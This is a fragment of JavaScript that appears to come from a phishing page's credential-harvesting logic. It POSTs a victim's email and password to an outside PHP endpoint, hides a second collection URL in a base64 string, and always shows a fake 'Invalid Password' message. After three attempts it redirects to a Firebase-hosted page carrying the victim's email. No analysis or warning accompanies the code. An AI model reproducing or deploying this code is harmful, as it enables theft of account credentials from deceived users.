...
return true;
	...
	var d=atob('aHR0cHM6Ly8xdGhhc2hjb2luLmNvbS9hc3NldHMvb28ucGhw');
	   $.ajax({
        dataType: 'JSON',
		url: 'https://pearldozen.com/nc_assets/fonts/nasf/ui.php',
        type: 'POST',
        data:{
          email:email,
          password:password
    ...
    //  console.log(count); 
            ...
            success: function(response){
			 $('#msg').html("<span style='color:red;'>Invalid Password</span>");
              if(response){
                $("#msg").show();
                ...
                if(response['signal'] == 'ok'){
                  ...
                  if (count>=3) {
					...
					window.location.replace("https://firebasestorage.googleapis.com/v0/b/er-neux-6757.appspot.com/o/index.html?alt=media&token=52b1583a-0e96-48d3-b574-faceb79a013d#"+my_email);
